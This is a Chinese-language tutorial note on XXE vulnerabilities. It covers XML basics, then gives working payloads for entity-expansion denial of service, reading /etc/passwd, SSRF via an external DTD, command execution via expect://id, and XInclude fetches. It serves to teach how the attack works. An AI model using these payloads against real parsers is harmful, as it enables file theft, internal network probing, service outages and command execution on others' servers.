


# XXE漏洞
当允许引用外部实体时，攻击者可以构造恶意的XML文件内容，导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等后果。一般的XEE攻击，只有在服务器有回显或则报错的基础上才能使用XXE漏洞来读取服务器的文件，但是也可以通过bind XXE的方式实现攻击。


## XML基础

**html 和 xml 的区别**

html 是用来显示数据的； xml 是用来描述数据、存放数据的，可以作为持久化介质。 Html 将数据和显示结合在一起，在页面中把这数据显示出来； xml 则将数据和显示分开。 XML 被设计用来描述数据，其焦点是数据的内容。 HTML 被设计用来显示数据，其焦点是数据的外观

XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。


语法

XML 文档在开头有 <?xml version="1.0" encoding="UTF-8" standalone="yes"?> 的结构，这种结构被称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，但是必须放在文档开头。

除了可选的开头外，XML 语法主要有以下的特性：

所有 XML 元素都须有关闭标签
XML 标签对大小写敏感
XML 必须正确地嵌套
XML 文档必须有根元素
XML 的属性值需要加引号
另外，XML也有CDATA语法，用于处理有多个字符需要转义的情况。



## 攻击方式

### 拒绝服务攻击

```xml
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```

若解析过程非常缓慢，则表示测试成功，目标站点可能有拒绝服务漏洞。 具体攻击可使用更多层的迭代或递归，也可引用巨大的外部实体，以实现攻击的效果。

### 读取文件

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

### 读取内网文件  SSRF(服务器端请求伪造)

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/" [
<!ELEMENT data (#ANY)>
]>
<data>4</data>
```

### RCE 

```xml
<?xml version="1.0"?>
<!DOCTYPE GVI [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<catalog>
   <core id="test101">
      <description>&xxe;</description>
   </core>
</catalog>
```

###  XInclude

```xml
<?xml version='1.0'?>
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
```




[参考](https://websec.readthedocs.io/zh/latest/vuln/xxe.html)

[ssrf](https://xz.aliyun.com/t/2115)